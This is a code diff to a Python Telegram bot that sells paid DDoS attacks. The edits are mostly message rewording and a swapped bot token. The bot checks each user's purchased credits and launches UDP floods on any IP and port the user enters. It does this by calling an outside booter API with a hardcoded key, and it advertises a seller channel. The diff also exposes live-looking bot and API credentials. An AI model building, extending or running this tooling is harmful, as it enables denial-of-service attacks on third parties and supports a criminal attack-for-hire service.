@@ -18,7 +18,7 @@ import MySQLdb
 from datetime import datetime
 from telegram import ReplyKeyboardMarkup
 
-token = "7176190122:AAHQcPdPWujrMBCkx78blBcnkn2slmGVLM0"
+token = "7176190122:AAHEkGMIVfnWGRVne2wUI-drCylhc8p_g88"
 
 admins = [1781676187]
 debug = True
@@ -128,7 +128,7 @@ def redeem(update: Update, context: CallbackContext):
                 mycursor.execute(sql)
                 mycursor.execute(sql2)
                 mydb.commit()
-                update.message.reply_text(f"<b>Successfully Redeemed ({result1}) Credits Into Yout Wallet🎉</b>",
+                update.message.reply_text(f"<b>Successfully Redeemed ({result1}) Credits Into Your Wallet🎉</b>",
                                           parse_mode=ParseMode.HTML)
             except:
                 mydb = mysql.connector.connect(
@@ -146,13 +146,13 @@ def redeem(update: Update, context: CallbackContext):
                 mycursor2.execute(sql2, val)
                 mydb.commit()
                 mydb.close()
-                update.message.reply_text(f"<b>Successfully Redeemed {result1} Credits Into Your Wallet🎉</b>",
+                update.message.reply_text(f"<b>Successfully Redeemed ({result1}) Credits Into Your Wallet.🎉</b>",
                                           parse_mode=ParseMode.HTML)
         else:
-            update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Key/Code🛑</b>" + '\n' + "<u>Enter Your Code Like This</u>:- /redeem PASTE-YOUR-KEY",
+            update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Code🛑</b>" + '\n' + "<u>Enter Your Redeem Code Like This</u>:- \n/redeem PASTE-YOUR-KEY",
                                       parse_mode=ParseMode.HTML)
     except:
-        update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Key/Code🛑</b>" + '\n' + "<u>Enter Your Code Like This</u>:- /redeem PASTE-YOUR-KEY",
+        update.message.reply_text("<b>🛑You Have Enter Wrong Redeem Code.🛑</b>" + '\n' + "<u>Enter Your Redeem Code Like This</u>:- \n/redeem PASTE-YOUR-KEY",
                                   parse_mode=ParseMode.HTML)
 
 
@@ -203,10 +203,10 @@ def createkey(update: Update, context: CallbackContext):
             mydb.close()
             update.message.reply_text(f"{generatedkey}", parse_mode=ParseMode.HTML)
         except:
-            update.message.reply_text("🔴Unable To Create Key Right Now. Please Contact Developer \n Correct Way:- /createekey <tokenamount>", parse_mode=ParseMode.HTML)
+            update.message.reply_text("🔴Unable To Create Redeem Code Right Now. Please Contact Developer \nCorrect Way:- /createekey <tokenamount>", parse_mode=ParseMode.HTML)
     else:
         context.bot.send_message(chat_id=update.effective_chat.id,
-                                 text="🔴Unable To Create Key Right Now. Please Contact Developer \n Correct Way:- /createekey <tokenamount>", parse_mode=ParseMode.HTML)
+                                 text="🔴Unable To Create Code Redeem Right Now. Please Contact Developer. \nCorrect Way:- /createekey <tokenamount>", parse_mode=ParseMode.HTML)
 
 
 # cmds /start /createkey /checktime /register (KEY) /deletekey (KEY) /call
@@ -214,7 +214,7 @@ def createkey(update: Update, context: CallbackContext):
 # main
 def start(update: Update, context: CallbackContext):
     update.message.reply_text(
-        f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Key💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Your Key From Official Sellers:- https://t.me/CRACKWAR🧾")
+        f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Code💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Redeem Code From Official Sellers:- https://t.me/CRACKWAR 🧾")
 
 
 def methods(update: Update, context: CallbackContext):
@@ -252,14 +252,14 @@ def attack(update: Update, context: CallbackContext):
                                           parse_mode=ParseMode.HTML)
                 return PART1
             except:
-                update.message.reply_text("🔴Please Enter Correct Command🔴")
+                update.message.reply_text("🔴Please Enter Correct Command.🔴")
         else:
             update.message.reply_text(
                 "<b>You Dont Have Enough Balance In Your Wallet To Start Attack🤕</b>" + '\n' + "<u>Please Contact Our Sellers To Buy Redeem Code💷</u>",
                 parse_mode=ParseMode.HTML)
     except:
         update.message.reply_text(
-                "<b>You Dont Have Enough Balance In Your Wallet To Start Attack🤕</b>" + '\n' + "<u>Please Contact Our Sellers To Buy Redeem Code💷</u>",
+                "<b>You Dont Have Enough Balance In Your Wallet To Start Attack.🤕</b>" + '\n' + "<u>Please Contact Our Sellers To Buy Redeem Code💷</u>",
             parse_mode=ParseMode.HTML)
 
 
@@ -305,7 +305,7 @@ def part4(update, context):
                 apireq = requests.get(
                     f"https://vani.ovh/api.php?key=hadesdzz&host={host}&port={port}&time={time}&method=udpplain")
                 update.message.reply_text(
-                    "💣 <b>Attack Has Been Started Successfully✅</b>" + '\n' + '\n' + f"🌟Match Ip:- {host}" + '\n' + f"🌟Match Port:- {port}" + '\n' + f"🌟Duration/Time:- {time}",
+                    "<b>Attack Has Been Started Successfully✅</b>" + '\n' + '\n' + f"🌟Match Ip:- {host}" + '\n' + f"🌟Match Port:- {port}" + '\n' + f"🌟Duration/Time:- {time}",
                     parse_mode=ParseMode.HTML)
                 return ConversationHandler.END
         else:
@@ -319,7 +319,7 @@ def part4(update, context):
 
 def help(update: Update, context: CallbackContext):
     update.message.reply_text(
-                f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Key💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Your Key From Official Sellers:- https://t.me/CRACKWAR🧾")
+                f"💟Welcome To Serex DDoS BoT😈 \n \n 👑Telegram's First Most Advance And Premium DDoS Bot Server🥇 \n\n 💨You can control me by sending these commands:- \n \n👉 /attack:- Start Attack On Your Match💥 \n 👉 /redeem:- Redeem Your Code💷 \n 👉 /Balance:- check available number of ddos attack💰 \n \n💳Purchase Redeem Code From Official Sellers:- https://t.me/CRACKWAR 🧾")
 
 
 def main():
